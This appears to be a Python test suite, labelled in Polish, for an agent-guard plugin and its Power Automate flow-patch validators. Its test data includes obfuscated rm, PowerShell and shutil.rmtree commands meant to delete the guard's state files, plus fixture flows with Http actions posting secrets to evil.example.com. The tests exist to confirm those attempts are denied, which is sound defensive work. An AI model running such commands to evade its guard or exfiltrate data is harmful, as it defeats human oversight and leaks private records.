       guard_in(S1, "Write", {"file_path": str(OTHER / ".claude/settings.json")}), None)
expect("uspiony: klikniecie w przegladarce",
       guard_in(S1, "mcp__Claude_Browser__computer", {"action": "left_click"}), None)
expect("uspiony: stan akceptacji nadal chroniony",
       guard_in(S1, "Write", {"file_path": str(TMP / "state/akceptacje/X.json")}), "deny")
expect("uspiony: dziennik wykonania nadal chroniony",
       guard_in(S1, "Write", {"file_path": str(WORK / "zgloszenia/INC-1/wykonanie.jsonl")}, WORK), "deny")
expect("uspiony: kopia definicji nadal nieczytelna",
       guard_in(S1, "Read", {"file_path": str(WORK / "zgloszenia/FP-1/backup/x.json")}, WORK), "deny")
expect("uspiony: rozmowa nadal nieaktywna", C.session_active(S1, OTHER), False)

expect("ppcall aktywuje rozmowe i wymaga akceptacji",
       guard_in(S1, "Bash", {"command": f"{Q} exec INC-404 1"}), "deny")
expect("po ppcall: curl zablokowany", guard_in(S1, "Bash", {"command": f"curl {DV}/api/data/v9.2/x"}), "deny")
expect("po ppcall: przegladarka pyta", guard_in(S1, "mcp__Claude_Browser__computer", {"action": "left_click"}), "ask")

S2 = "sesja-skill-2"
expect("skill pp-support aktywuje", guard_in(S2, "Skill", {"skill": "pp-support:zgloszenie"}), None)
expect("po skillu: curl zablokowany", guard_in(S2, "Bash", {"command": f"curl {DV}/x"}), "deny")
S2b = "sesja-inny-skill"
guard_in(S2b, "Skill", {"skill": "ekovoltis:raport-pdf"})
expect("inny skill nie aktywuje", C.session_active(S2b, OTHER), False)

S3 = "sesja-prompt-3"
hook("hook_prompt", {"prompt": "Dyżur: sprawdź automat 007", "cwd": str(OTHER), "session_id": S3})
expect("wiadomosc od slowa 'dyzur' aktywuje", C.session_active(S3, OTHER), True)
for i, text in enumerate(["akceptuję tę zmianę w ELM", "Mam dyżur w piątek, przesuń spotkanie"]):
    hook("hook_prompt", {"prompt": text, "cwd": str(OTHER), "session_id": f"sesja-proza-{i}"})
    expect(f"zwykle zdanie nie aktywuje: {text}", C.session_active(f"sesja-proza-{i}", OTHER), False)
S3b = "sesja-prompt-3b"
hook("hook_prompt", {"prompt": "Dodaj filtr do tabeli w ELM", "cwd": str(OTHER), "session_id": S3b})
expect("zwykla wiadomosc nie aktywuje", C.session_active(S3b, OTHER), False)

cfg = C.load_config()
cfg["support_dirs"] = [str(TMP / "dyzur")]
C.save_config(cfg)
(TMP / "dyzur" / "sub").mkdir(parents=True, exist_ok=True)
expect("folder dyzurny: aktywna od startu", guard_in("sesja-4", "Bash", {"command": f"curl {DV}/x"}, TMP / "dyzur" / "sub"), "deny")
expect("folder dyzurny: po cd poza folder nadal aktywna", guard_in("sesja-4", "Bash", {"command": f"curl {DV}/x"}, OTHER), "deny")
cfg["support_dirs"] = []
C.save_config(cfg)
expect("brak identyfikatora rozmowy: pilnuje (fail closed)", guard_in(None, "Bash", {"command": f"curl {DV}/x"}), "deny")
expect("zly identyfikator rozmowy: pilnuje", guard_in("../../x", "Bash", {"command": f"curl {DV}/x"}), "deny")
expect("znacznik aktywacji chroniony", guard_in("sesja-5", "Bash", {"command": f"rm {TMP}/state/sesje/{S1}.json"}), "deny")
for label, cmd in [("wzorzec nazwy", "rm ~/.claude/pp-support-st*/sesje/*"),
                   ("sklejanie nazwy", "cd ~/.claude && rm pp-support-sta''te/sesje/*"),
                   ("znak zapytania", "echo {} > ~/.claude/pp-supp?rt-state/akceptacje/A.json")]:
    expect(f"stan: obejscie przez {label}", guard_in("sesja-5", "Bash", {"command": cmd}), "deny")
expect("stan: PowerShell sklejanie", guard_in("sesja-5", "PowerShell", {"command":
       'Remove-Item (Join-Path $HOME ".claude\pp-support-" + "state\sesje\*")'}), "deny")
expect("uspiony: zwykle polecenie z .claude", guard_in("sesja-5", "Bash", {"command": "ls .claude/skills/*"}), None)
expect("uspiony: aktualizacja pluginu", guard_in("sesja-5", "Bash",
       {"command": "claude plugin update pp-support@ekovoltis-it --scope user"}), None)
# 1.1.1: praca nad kodem pluginu i zwykle polecenia nie sa traktowane jak obejscie ochrony stanu
for label, tool, cmd in [
        ("cd do pluginu w cudzyslowie", "Bash", f'cd "{ROOT}" && python tests/test_harness.py'),
        ("cd do pluginu w apostrofach", "Bash", f"cd '{ROOT.as_posix()}' && git status"),
        ("cd do pluginu w PowerShell", "PowerShell", f'Set-Location "{ROOT}"; git status'),
        ("grep po slowie akceptacje", "Bash", "grep -rn akceptacje scripts/ tests/"),
        ("commit z nazwa pluginu", "Bash", 'git commit -m "pp-support 1.1.1: poprawka straznika"'),
        ("notatka heredoc", "Bash", "cat > notatka.md <<'EOF'\nakceptacje i sesje w pp-support, ~30 min\nEOF"),
        ("katalog sesje w projekcie", "Bash", "ls docs/sesje/"),
        ("glob w projekcie", "Bash", "ls plugins/pp-*/scripts/*.py"),
        ("commit z .claude i akceptacjami", "Bash",
         'git commit -m "pp-support: akceptacje, sesje i .claude/settings.local.json"')]:
    expect(f"1.1.1 przechodzi: {label}", guard_in("sesja-5", tool, {"command": cmd}), None)
for label, tool, cmd, cwd in [
        ("cd ~/.claude i pp-s*", "Bash", "cd ~/.claude && rm -r pp-s*/akceptacje", OTHER),
        ("$HOME i pp-supp*", "Bash", "rm -rf $HOME/.claude/pp-supp*", OTHER),
        ("~ i .cl*", "Bash", "cd ~ && rm -r .cl*/pp-*/sesje", OTHER),
        ("sklejone .claude i glob", "Bash", "cd && rm -r .cl''aude/pp-sup*", OTHER),
        ("USERPROFILE w PowerShell", "PowerShell", 'Remove-Item "$env:USERPROFILE\\.claude\\pp-s*" -Recurse', OTHER),
        ("sklejanie w cudzyslowach", "Bash", 'rm -r "pp-support-"\'state\'/sesje', OTHER),
        ("glob pod .claude", "Bash", "rm -rf ~/.claude/p*", OTHER),
        ("sciezka przez ..", "Bash", "rm -r ../../../.c*/pp-s*", OTHER),
        (".c* bez .cl", "Bash", "cd /c/Users/x && rm -r .c*/pp-supp*/sesje", OTHER),
        (".[c]laude", "Bash", "rm -r .[c]laude/pp-*/akceptacje/", OTHER),
        ("glob za domem", "PowerShell", f"Remove-Item {Path.home()}\\*\\pp-supp* -Recurse", OTHER),
        ("glob za domem (Git Bash)", "Bash",
         "rm -rf /" + Path.home().as_posix().replace(":", "", 1).lower() + "/.c?aude/pp-supp*", OTHER),
        ("zmienna rozbija kotwice", "Bash", "rm -r /c/Users/x/.cl${e}aude/pp-supp*", OTHER),
        ("glob *-state bez kotwicy", "Bash", "rm -r $D/*-state", OTHER),
        ("interpreter z fragmentem nazwy", "Bash",
         "python -c \"import shutil; shutil.rmtree('%s-state' % 'pp-support')\"", OTHER),
        ("sasiednie literaly", "Bash",
         "python -c \"import shutil,os; shutil.rmtree(os.path.join('/x', 'pp-support-' 'state'))\"", OTHER),
        ("akceptacje z cwd w .claude", "Bash", "rm -r */akceptacje", Path.home() / ".claude"),
        ("cwd w katalogu stanu", "Bash", "rm -f *.json", TMP / "state/akceptacje")]:
    expect(f"1.1.1 nadal deny: {label}", guard_in("sesja-5", tool, {"command": cmd}, cwd), "deny")
guard_in("sesja-7", "Bash", {"command": "bash scripts/ppcall&&ls"})
expect("ppcall&& aktywuje", C.session_active("sesja-7", OTHER), True)
cfg_file = TMP / "state/config.json"
saved = cfg_file.read_text(encoding="utf-8")
cfg_file.write_text("{niepelny", encoding="utf-8")
expect("nieczytelna konfiguracja: pilnuje", guard_in("sesja-8", "Bash", {"command": f"curl {DV}/x"}), "deny")
cfg_file.write_text(saved, encoding="utf-8")

r = subprocess.run([BASH, str(SCRIPTS / "run-py"), "hook_session_start"], capture_output=True, text=True,
                   encoding="utf-8", errors="replace", env=os.environ, timeout=120,
                   input=json.dumps({"session_id": "sesja-6", "cwd": str(OTHER)}))
expect("SessionStart: uspiony plugin nic nie dopisuje", r.stdout.strip(), "")
r = subprocess.run([BASH, str(SCRIPTS / "run-py"), "hook_session_start"], capture_output=True, text=True,
                   encoding="utf-8", errors="replace", env=os.environ, timeout=120, input="")
expect("SessionStart bez danych: pelny komunikat", "Tryb pracy" in r.stdout, True)

print("25. hooks.json obejmuje wszystkie narzedzia, ktore pilnuje straznik")
import re as _re  # noqa: E402
hooks_cfg = json.loads((ROOT / "hooks/hooks.json").read_text(encoding="utf-8"))
matcher = _re.compile("^(" + hooks_cfg["hooks"]["PreToolUse"][0]["matcher"] + ")$")
for tool in ["Bash", "PowerShell", "Write", "Edit", "MultiEdit", "NotebookEdit", "Read", "Skill",
             "mcp__claude-in-chrome__computer", "mcp__Claude_Browser__navigate", "mcp__dataverse__update_record"]:
    expect(f"hooks.json: {tool}", bool(matcher.match(tool)), True)

print("26. 1.2.0: szerszy flow-patch (Select, Query, warunki, runAfter)")
P = importlib.reload(P)
WF3 = "5b2f7a10-1c3d-4e5f-8a9b-0c1d2e3f4a5b"
A3 = ["properties", "definition", "actions"]
DEF3 = {"properties": {
    "connectionReferences": {"shared_teams": {"connection": {"connectionReferenceLogicalName": "eko_teams"}}},
    "definition": {"triggers": {"Recurrence": {"type": "Recurrence", "recurrence": {"frequency": "Day"}}},
                   "actions": {
        "Scope_|_Prepare": {"type": "Scope", "runAfter": {}, "actions": {
            "Select_Missing_PointActivityPeriods": {"type": "Select", "runAfter": {},
                                                    "inputs": {"from": "@body('X')", "select": {"Jednostka": "@item()?['name']"}}},
            "Filter_array": {"type": "Query", "runAfter": {"Select_Missing_PointActivityPeriods": ["Succeeded"]},
                             "inputs": {"from": "@body('Select_Missing_PointActivityPeriods')", "where": "@true"}}}},
        "Initialize_Day_Ahead": {"type": "InitializeVariable", "runAfter": {"Scope_|_Prepare": ["Succeeded"]},
                                 "inputs": {"variables": [{"name": "Day Ahead", "type": "string", "value": "@{utcNow()}"}]}},
        "Condition": {"type": "If", "runAfter": {"Initialize_Day_Ahead": ["Succeeded"]},
                      "expression": {"and": [{"greater": ["@length(body('Filter_array'))", 0]}]},
                      "actions": {"Post_message": {"type": "OpenApiConnection", "runAfter": {},
                                                   "inputs": {"host": {"connectionName": "shared_teams",
                                                                       "operationId": "PostMessageToConversation"},
                                                              "parameters": {"body/messageBody": "<p>Brak okresow</p>"}}}},
                      "else": {"actions": {}}},
        "Send_HTTP": {"type": "Http", "runAfter": {"Condition": ["Succeeded"]},
                      "inputs": {"method": "POST", "uri": "https://example.org/hook", "body": "@{1}"}}}}}}


class FakeFlow(FakeDataverse):
    """Dataverse z jednym flow WF3; opcjonalnie zapis zmienia stan albo dodaje roznice."""

    def reset(self, managed=False, definition=None):
        super().reset(managed)
        self.clientdata = json.dumps(definition or DEF3, ensure_ascii=False)
        self.state_after_write = None

    def record(self):
        r = super().record()
        if self.state_after_write is not None and self.patches:
            r["statecode"] = self.state_after_write
        return r

    def __call__(self, method, url, body=None, timeout=90, headers=None):
        if method == "PATCH" and self.extra_change and body:
            data = json.loads(body["clientdata"])
            data["properties"]["definition"]["triggers"]["Recurrence"]["recurrence"]["frequency"] = "Hour"
            body, self.extra_change = {"clientdata": json.dumps(data)}, False
        return super().__call__(method, url.replace(WF3, WF), body, timeout, headers)


FD = FakeFlow()
P.http = FD
cfg = C.load_config()
cfg["flow_patch_dataverse_urls"] = [DV]
cfg["flow_definition_dataverse_urls"] = []
C.save_config(cfg)
SEL = A3 + ["Scope_|_Prepare", "actions", "Select_Missing_PointActivityPeriods", "inputs", "select"]
WHERE = A3 + ["Scope_|_Prepare", "actions", "Filter_array", "inputs", "where"]
COND = A3 + ["Condition", "expression"]
RA = A3 + ["Initialize_Day_Ahead", "runAfter"]
for label, path in [("Select inputs/select", SEL), ("Query inputs/where", WHERE), ("If expression", COND),
                    ("runAfter", RA), ("Terminate runStatus", A3 + ["T", "inputs", "runStatus"]),
                    ("Foreach foreach", A3 + ["F", "foreach"]), ("Table columns", A3 + ["T", "inputs", "columns"])]:
    expect(f"1.2.0 flow-patch: {label} dozwolone", C.flow_patch_path_problem(path), None)
for label, path in [("glebiej w select", SEL + ["Jednostka"]), ("runAfter/x", RA + ["x"]),
                    ("expression w inputs", A3 + ["Condition", "inputs", "expression"]),
                    ("type", A3 + ["Condition", "type"]), ("uri", A3 + ["Send_HTTP", "inputs", "uri"])]:
    expect(f"1.2.0 flow-patch: {label} odrzucone", C.flow_patch_path_problem(path) is not None, True)

SEL_OLD = {"Jednostka": "@item()?['name']"}
SEL_NEW = {"Jednostka": "@item()?['name']", "PPE": "@item()?['ppe']",
           "Link": "@concat('https://ekovoltis.crm4.dynamics.com/main.aspx?id=', item()?['id'])"}


def fp3(changes, extra_sections=True):
    step = {"nr": 1, "opis": "Komunikat z linkiem do jednostki", "typ": "flow-patch", "srodowisko": DV,
            "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z", "zmiany": changes}
    return fp_plan([]).replace("FP-1", "FP3-1").split("## Kroki")[0] + "## Kroki\n```json\n" + \
        json.dumps([step], ensure_ascii=False, indent=1) + "\n```\n"


def live3(changes, definition=DEF3):
    wf = {"ismanaged": False, "category": 5, "modifiedon": "m", "clientdata": json.dumps(definition)}
    return C.flow_patch_live_problems({"oczekiwany_modifiedon": "m", "zmiany": changes}, wf)[0]


expect("1.2.0: Select z JSON, inna kolejnosc kluczy w 'bylo'",
       live3([{"sciezka": SEL, "bylo": json.loads(json.dumps(SEL_OLD)), "ma_byc": SEL_NEW}]), [])
expect("1.2.0: inputs/select w akcji innej niz Select odrzucone",
       any("tylko w akcji Select" in e for e in live3(
           [{"sciezka": A3 + ["Udaje_Select", "inputs", "select"], "bylo": "x", "ma_byc": "y"}],
           {"properties": {"definition": {"actions": {"Udaje_Select": {"type": "Compose", "inputs": {"select": "x"}}}}}})), True)
expect("1.2.0: expression w akcji innej niz If/Until",
       bool(live3([{"sciezka": A3 + ["Send_HTTP", "expression"], "bylo": "x", "ma_byc": "y"}])), True)
expect("1.2.0: runAfter na akcje z innego zakresu",
       any("spoza tego zakresu" in e for e in live3([{"sciezka": RA, "bylo": {"Scope_|_Prepare": ["Succeeded"]},
                                                      "ma_byc": {"Filter_array": ["Succeeded"]}}])), True)
expect("1.2.0: runAfter z cyklem",
       any("cykl" in e for e in live3([{"sciezka": A3 + ["Scope_|_Prepare", "runAfter"], "bylo": {},
                                        "ma_byc": {"Condition": ["Succeeded"]}}])), True)
expect("1.2.0: runAfter przestawiony poprawnie",
       live3([{"sciezka": RA, "bylo": {"Scope_|_Prepare": ["Succeeded"]}, "ma_byc": {}},
              {"sciezka": A3 + ["Scope_|_Prepare", "runAfter"], "bylo": {}, "ma_byc": {"Initialize_Day_Ahead": ["Succeeded"]}}]), [])
expect("1.2.0: runAfter ze zlym statusem (statycznie)",
       any("statusy" in e for e in C.flow_patch_problems(json.loads(fp3([{"sciezka": RA, "bylo": {}, "ma_byc": {"Condition": ["Done"]}}]).split("```json\n")[1].split("\n```")[0])[0], 1)), True)
expect("1.2.0: parameters nadal tylko tekst",
       any("tekstem" in e for e in C.flow_patch_problems({"srodowisko": DV, "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z",
                                                          "zmiany": [{"sciezka": A3 + ["Condition", "actions", "Post_message", "inputs", "parameters", "body/messageBody"],
                                                                      "bylo": "<p>Brak okresow</p>", "ma_byc": {"x": 1}}]}, 1)), True)
expect("1.2.0: zmiana zawierajaca inna zmiane",
       any("zawiera" in e for e in C.flow_patch_problems({"srodowisko": DV, "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z",
                                                          "zmiany": [{"sciezka": A3 + ["Initialize_Day_Ahead", "inputs"], "bylo": 1, "ma_byc": 2},
                                                                     {"sciezka": A3 + ["Initialize_Day_Ahead", "inputs", "variables", "0", "value"], "bylo": "a", "ma_byc": "b"}]}, 1)), True)

text = fp3([{"sciezka": SEL, "bylo": SEL_OLD, "ma_byc": SEL_NEW},
            {"sciezka": A3 + ["Condition", "actions", "Post_message", "inputs", "parameters", "body/messageBody"],
             "bylo": "<p>Brak okresow</p>", "ma_byc": "<p>Jednostki bez okresu aktywnosci na dzien @{variables('Day Ahead')}</p>"}])
code, txt = plan_check(text, "FP3-1")
expect("1.2.0 flow-patch Select: plan-check", (code, txt.count("ma byc:")), (None, 2))
accept("FP3-1", text)
ask = hook("hook_guard", {"tool_name": "Bash", "tool_input": {"command": f"{Q} exec FP3-1 1"}, "cwd": str(WORK)})
expect("1.2.0 flow-patch Select: pytanie z wartoscia JSON",
       "PPE" in ((ask or {}).get("hookSpecificOutput", {}).get("permissionDecisionReason", "")), True)
expect("1.2.0 flow-patch Select: exec", run_exec("FP3-1"), None)
written = json.loads(FD.clientdata)
expect("1.2.0 flow-patch Select: nowe mapowanie", C.get_at(written, SEL), SEL_NEW)
expect("1.2.0 flow-patch Select: reszta bez zmian",
       [d for d in C.leaf_diff(DEF3, written) if d[:len(SEL)] != tuple(SEL)],
       [tuple(A3 + ["Condition", "actions", "Post_message", "inputs", "parameters", "body/messageBody"])])

print("27. 1.2.0: krok flow-definition (pelna definicja z pliku)")
FD.reset()


def fd_plan(incident, plik, sha, modifiedon="2026-08-25T09:52:49Z", env=DV):
    step = {"nr": 1, "opis": "Data dnia w komunikacie: nowa akcja Compose", "typ": "flow-definition",
            "srodowisko": env, "workflowid": WF3, "oczekiwany_modifiedon": modifiedon, "plik": plik, "sha256": sha}
    return fp_plan([]).replace("FP-1", incident).split("## Kroki")[0] + "## Kroki\n```json\n" + \
        json.dumps([step], ensure_ascii=False, indent=1) + "\n```\n"


def write_def(incident, definition, name=None) -> tuple[str, str]:
    d = WORK / "zgloszenia" / incident
    d.mkdir(parents=True, exist_ok=True)
    name = name or f"flow-{WF3}-nowa.json"
    path = d / name
    path.write_text(json.dumps(definition, ensure_ascii=False, indent=1), encoding="utf-8")
    return name, C.file_sha256(path)


NEWDEF = copy.deepcopy(DEF3)
acts = NEWDEF["properties"]["definition"]["actions"]
acts["Compose_Dzien"] = {"type": "Compose", "runAfter": {"Scope_|_Prepare": ["Succeeded"]},
                         "inputs": "@formatDateTime(addDays(utcNow(), 1), 'yyyy-MM-dd')"}
acts["Initialize_Day_Ahead"]["runAfter"] = {"Compose_Dzien": ["Succeeded"]}
del acts["Scope_|_Prepare"]["actions"]["Filter_array"]
acts["Condition"]["expression"] = {"and": [{"greater": ["@length(body('Select_Missing_PointActivityPeriods'))", 0]}]}

name, sha = write_def("FD-1", NEWDEF)
code, txt = plan_check(fd_plan("FD-1", name, sha), "FD-1")
expect("flow-definition: wylaczony bez ustawienia", (code, "nie jest wlaczony" in txt), (2, True))
cfg["flow_definition_dataverse_urls"] = [DV]
C.save_config(cfg)
code, txt = plan_check(fd_plan("FD-1", name, sha), "FD-1")
expect("flow-definition: plan-check przechodzi", code, None)
expect("flow-definition: diff pokazuje dodana akcje", "dodana: Compose_Dzien (Compose)" in txt, True)
expect("flow-definition: diff pokazuje usunieta akcje", "usunieta: Filter_array (Query)" in txt, True)
expect("flow-definition: diff pokazuje zmieniona akcje", "zmieniona: Condition (If)" in txt, True)
expect("flow-definition: krok wycofania wypisany", '"plik": "backup/' in txt, True)
expect("flow-definition: plan-check niczego nie zapisuje", FD.patches, [])
expect("flow-definition: zly skrot", plan_check(fd_plan("FD-1", name, "0" * 64), "FD-1")[0], 2)
expect("flow-definition: plik spoza katalogu", plan_check(fd_plan("FD-1", "../x.json", sha), "FD-1")[0], 2)
expect("flow-definition: inna nazwa pliku", plan_check(fd_plan("FD-1", "nowa.json", sha), "FD-1")[0], 2)
expect("flow-definition: srodowisko spoza listy",
       plan_check(fd_plan("FD-1", name, sha, env="https://ekovoltis.crm4.dynamics.com"), "FD-1")[0], 2)
expect("flow-definition: bez sekcji Analiza wpływu",
       plan_check(fd_plan("FD-1", name, sha).replace("## Analiza wpływu", "## Inne"), "FD-1")[0], 2)


def bad_def(change):
    d = copy.deepcopy(NEWDEF)
    change(d)
    return d


def wf_live(definition, new, restoring=False):
    wf = {"ismanaged": False, "category": 5, "modifiedon": "m", "clientdata": json.dumps(definition)}
    return C.flow_definition_live_problems({"oczekiwany_modifiedon": "m"}, wf, new, restoring)[0]


expect("flow-definition na zywo: poprawna", wf_live(DEF3, NEWDEF), [])
for label, change, needle in [
    ("zmiana wyzwalacza", lambda d: d["properties"]["definition"]["triggers"]["Recurrence"]["recurrence"].update(frequency="Hour"), "poza akcjami"),
    ("zmiana connectionReferences", lambda d: d["properties"]["connectionReferences"]["shared_teams"]["connection"].update(connectionReferenceLogicalName="inne"), "poza akcjami"),
    ("dodany $connections", lambda d: d["properties"].setdefault("definition", {}).setdefault("parameters", {}).update({"$connections": {}}), "poza akcjami"),
    ("dodana akcja Http", lambda d: d["properties"]["definition"]["actions"].update(
        Wyslij={"type": "Http", "runAfter": {}, "inputs": {"method": "POST", "uri": "https://evil.example.com", "body": "@{body('X')}"}}), "Wyslij"),
    ("dodana akcja konektora", lambda d: d["properties"]["definition"]["actions"].update(
        Mail={"type": "OpenApiConnection", "runAfter": {}, "inputs": {"host": {"connectionName": "shared_teams"}, "parameters": {}}}), "Mail"),
    ("zmiana host w istniejacej akcji", lambda d: d["properties"]["definition"]["actions"]["Condition"]["actions"]["Post_message"]["inputs"]["host"].update(connectionName="shared_office365"), "Post_message"),
    ("zmiana uri w Http", lambda d: d["properties"]["definition"]["actions"]["Send_HTTP"]["inputs"].update(uri="https://evil.example.com"), "Send_HTTP"),
    ("zmiana body akcji Http", lambda d: d["properties"]["definition"]["actions"]["Send_HTTP"]["inputs"].update(body="@{body('Tajne')}"), "Send_HTTP"),
    ("zmiana typu akcji", lambda d: d["properties"]["definition"]["actions"]["Compose_Dzien"].update(type="Http"), "Compose_Dzien"),
    ("runAfter na nieistniejaca akcje", lambda d: d["properties"]["definition"]["actions"]["Compose_Dzien"].update(runAfter={"Brak": ["Succeeded"]}), "Brak"),
    ("cykl runAfter", lambda d: d["properties"]["definition"]["actions"]["Compose_Dzien"].update(runAfter={"Initialize_Day_Ahead": ["Succeeded"]}), "cykl"),
    ("klucz uri w nowej Compose", lambda d: d["properties"]["definition"]["actions"]["Compose_Dzien"].update(inputs={"uri": "https://x"}), "Compose_Dzien"),
    ("powtorzona nazwa akcji", lambda d: d["properties"]["definition"]["actions"]["Condition"]["else"]["actions"].update(
        Compose_Dzien={"type": "Compose", "runAfter": {}, "inputs": "x"}), "wiecej niz raz"),
    ("ponad 10 akcji", lambda d: d["properties"]["definition"]["actions"]["Condition"]["else"]["actions"].update(
        {f"C{i}": {"type": "Compose", "runAfter": {}, "inputs": i} for i in range(10)}), "najwyzej 10"),
]:
    errs = wf_live(DEF3, bad_def(change))
    expect(f"flow-definition odrzuca: {label}", any(needle in e for e in errs), True)
expect("flow-definition: bez zmian akcji", any("nie zmienia" in e for e in wf_live(DEF3, copy.deepcopy(DEF3))), True)
FD.reset(managed=True)
expect("flow-definition: flow zarzadzany", plan_check(fd_plan("FD-1", name, sha), "FD-1")[0], 2)
FD.reset()

text = fd_plan("FD-1", name, sha)
plan_check(text, "FD-1")
accept("FD-1", text)
ask = hook("hook_guard", {"tool_name": "Bash", "tool_input": {"command": f"{Q} exec FD-1 1"}, "cwd": str(WORK)})
expect("flow-definition: exec -> pytanie", (ask or {}).get("hookSpecificOutput", {}).get("permissionDecision"), "ask")
expect("flow-definition: pytanie mowi o kopii i pliku",
       "przywroci kopie" in (ask or {}).get("hookSpecificOutput", {}).get("permissionDecisionReason", ""), True)
(WORK / "zgloszenia/FD-1" / name).write_text(json.dumps(bad_def(lambda d: d["properties"]["definition"]["actions"].update(
    Wyslij={"type": "Compose", "runAfter": {}, "inputs": "x"})), ensure_ascii=False), encoding="utf-8")
expect("flow-definition: plik zmieniony po akceptacji -> hook odmawia", decision(f"{Q} exec FD-1 1"), "deny")
expect("flow-definition: plik zmieniony po akceptacji -> ppcall odmawia", run_exec("FD-1"), 3)
expect("flow-definition: nic nie zapisano", FD.patches, [])
write_def("FD-1", NEWDEF)
expect("flow-definition: exec", run_exec("FD-1"), None)
expect("flow-definition: If-Match", FD.patches[0]["if_match"] if FD.patches else None, 'W/"100"')
expect("flow-definition: zapisana definicja = plik", C.leaf_diff(NEWDEF, json.loads(FD.clientdata)), [])
backups = sorted(C.backup_dir("FD-1").glob(f"{WF3}-*.json"))
expect("flow-definition: kopia", len(backups), 1)
entry = json.loads((WORK / "zgloszenia/FD-1/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()[-1])
expect("flow-definition: dziennik", (entry["sukces"], bool(entry.get("kopia_sha256")), len(entry.get("zmiany_akcji", []))),
       (True, True, 4))
expect("flow-definition: kopia w rejestrze kopii", C.is_registered_backup(WF3, entry["kopia_sha256"]), True)

print("   wycofanie z kopii (przywraca usunieta akcje bez ograniczen kluczy)")
REM = copy.deepcopy(DEF3)
del REM["properties"]["definition"]["actions"]["Send_HTTP"]
FD.reset()
name, sha = write_def("FD-2", REM)
text = fd_plan("FD-2", name, sha)
expect("usuniecie akcji Http: plan-check", plan_check(text, "FD-2")[0], None)
accept("FD-2", text)
expect("usuniecie akcji Http: exec", run_exec("FD-2"), None)
entry = json.loads((WORK / "zgloszenia/FD-2/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()[-1])
kopia = Path(entry["kopia"])
rel = f"backup/{kopia.name}"
expect("wycofanie z kopii: kopia w stanie", kopia.parent == C.backup_dir("FD-2"), True)
text = fd_plan("FD-3", rel, entry["kopia_sha256"], modifiedon=entry["modifiedon_po"])
code, txt = plan_check(text, "FD-3")  # kopia z innego zgloszenia (FD-2), jednoznaczna nazwa
expect("wycofanie z kopii: plan-check", (code, "dodana: Send_HTTP (Http)" in txt), (None, True))
accept("FD-3", text)
expect("wycofanie z kopii: exec", run_exec("FD-3"), None)
expect("wycofanie z kopii: definicja jak przed zmiana", C.leaf_diff(DEF3, json.loads(FD.clientdata)), [])
fake = WORK / "zgloszenia/FD-4/backup" / f"{WF3}-20261104T100000Z.json"
fake.parent.mkdir(parents=True, exist_ok=True)
fake.write_text(json.dumps(bad_def(lambda d: d["properties"]["definition"]["actions"].update(
    Wyslij={"type": "Http", "runAfter": {}, "inputs": {"method": "POST", "uri": "https://evil.example.com"}})),
    ensure_ascii=False), encoding="utf-8")
code, txt = plan_check(fd_plan("FD-4", f"backup/{fake.name}", C.file_sha256(fake), modifiedon=FD.modifiedon), "FD-4")
expect("podrobiona kopia spoza rejestru: Http odrzucone", (code, "Wyslij" in txt), (2, True))

print("   zapis niezgodny z plikiem albo zmiana stanu -> przywrocenie kopii")
for incident, setup, needle in [("FD-5", lambda: setattr(FD, "extra_change", True), "nieoczekiwane_roznice"),
                                ("FD-6", lambda: setattr(FD, "state_after_write", 0), "stan_flow")]:
    FD.reset()
    name, sha = write_def(incident, NEWDEF)
    text = fd_plan(incident, name, sha)
    plan_check(text, incident)
    accept(incident, text)
    setup()
    expect(f"{incident}: krok nieudany", run_exec(incident), 4)
    expect(f"{incident}: definicja przywrocona", C.leaf_diff(DEF3, json.loads(FD.clientdata)), [])
    entry = json.loads((WORK / f"zgloszenia/{incident}/wykonanie.jsonl").read_text(encoding="utf-8").splitlines()[-1])
    expect(f"{incident}: w dzienniku", (bool(entry.get(needle)), entry.get("przywrocono")), (True, True))

print("28. 1.2.0: odczyt Dataverse z nazwami, runs po workflowid, rejestr, konfiguracja, bez SWO")
expect("Prefer dla Dataverse", "FormattedValue" in json.dumps(P.read_headers(f"{DV}/api/data/v9.2/accounts")), True)
expect("bez Prefer dla Flow API", P.read_headers("https://api.flow.microsoft.com/x"), {})
cfg["dataverse_urls"] = [DV]
C.save_config(cfg)
FLOWID = "9c1a2b3c-4d5e-6f70-8192-a3b4c5d6e7f8"


def env_api(m, u, b=None, timeout=90, headers=None):
    if u.startswith("https://api.bap.microsoft.com/"):
        return 200, json.dumps({"value": [
            {"name": "Default-0000", "properties": {"linkedEnvironmentMetadata": {"instanceUrl": "https://inne.crm4.dynamics.com/"}}},
            {"name": ENV, "properties": {"linkedEnvironmentMetadata": {"instanceUrl": DV + "/"}}}]}).encode()
    if u.startswith(f"{DV}/api/data/v9.2/workflows({WF3})"):
        return 200, json.dumps({"name": "007_Send Notifications to Producers", "resourceid": FLOWID,
                                "workflowidunique": WF}).encode()
    if u == f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOWID}?api-version=2016-11-01":
        return 200, b"{}"
    return 404, b"{}"


P.http = env_api
expect("runs: srodowisko i flow z adresu Dataverse", P.resolve_flow(DV, WF3), (ENV, FLOWID))
try:
    P.resolve_flow("https://obce.crm4.dynamics.com", WF3)
    expect("runs: Dataverse spoza listy", "brak bledu", "RuntimeError")
except RuntimeError:
    expect("runs: Dataverse spoza listy", "RuntimeError", "RuntimeError")
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    P.cmd_rejestr(["akdw"])
first = [l for l in buf.getvalue().splitlines() if l.startswith("prefix")][:1]
expect("rejestr: dokladne trafienie akronimu pierwsze", first, ["prefix      : 007"])
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    P.cmd_rejestr(["--flow", DV, WF3])
expect("rejestr --flow: numer z nazwy flow", "akronim     : AKDW" in buf.getvalue() and "AKDWT" not in buf.getvalue(), True)
expect("straznik: ppcall konfiguracja", decision(f"{Q} konfiguracja"), "allow")
r = subprocess.run([BASH, PPCALL, "konfiguracja"], cwd=WORK, capture_output=True, text=True, encoding="utf-8",
                   errors="replace", env=os.environ, timeout=120)
expect("ppcall konfiguracja: wypisuje ustawienia", "flow_definition_dataverse_urls" in r.stdout, True)
swo = [str(p.relative_to(ROOT)) for p in list((ROOT / "scripts").glob("*.py")) + list((ROOT / "skills").rglob("*.md"))
       + [ROOT / "README.md"] if "SWO" in p.read_text(encoding="utf-8")]
expect("bez odwolan do SWO w kodzie, skillach i README", swo, [])
